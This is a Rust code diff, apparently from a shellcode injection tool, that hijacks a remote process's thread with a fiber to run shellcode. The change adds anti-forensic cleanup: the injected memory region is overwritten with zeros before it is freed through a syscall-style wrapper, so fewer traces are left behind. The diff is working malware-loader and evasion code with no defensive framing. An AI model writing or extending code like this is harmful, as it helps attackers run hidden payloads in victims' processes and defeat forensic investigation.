@@ -290,10 +290,15 @@ fn main() -> Result<()> {
                                 let h_thread = pi.hThread;
 
                                 match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
-                                     Ok((addr, _size)) => {
+                                     Ok((addr, size)) => {
                                          // println!("[+] Success!");
                                          if use_cleanup {
                                              thread::sleep(Duration::from_millis(5000));
+                                             
+                                             // zero memory before return to OS
+                                             let zeros = vec![0u8; size];
+                                             let _ = remote_fiber::remote_write(h_process, addr, &zeros);
+
                                              let mut region_size: usize = 0;
                                              let mut base_addr = addr;
                                              missed_calls::nt_free_virtual_memory(
@@ -363,17 +368,22 @@ fn main() -> Result<()> {
                     };
 
                     match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
-                        Ok((addr, _size)) => {
+                        Ok((addr, size)) => {
                                  if use_cleanup {
                                      thread::sleep(Duration::from_millis(5000));
+                                     
+                                     // zero out memory first
+                                     let zeros = vec![0u8; size];
+                                     let _ = remote_fiber::remote_write(h_process, addr, &zeros);
+
                                      let mut region_size: usize = 0;
-                                 let mut base_addr = addr;
-                                 missed_calls::nt_free_virtual_memory(
-                                    h_process.0 as *mut winapi::ctypes::c_void,
-                                    &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
-                                    &mut region_size as *mut usize as *mut winapi::shared::basetsd::SIZE_T,
-                                    0x8000
-                                 );
+                                     let mut base_addr = addr;
+                                     missed_calls::nt_free_virtual_memory(
+                                        h_process.0 as *mut winapi::ctypes::c_void,
+                                        &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
+                                        &mut region_size as *mut usize as *mut winapi::shared::basetsd::SIZE_T,
+                                        0x8000
+                                     );
                             }
                             let _ = remote_fiber::close_thread_handle(h_thread);
                             injection_success = true;
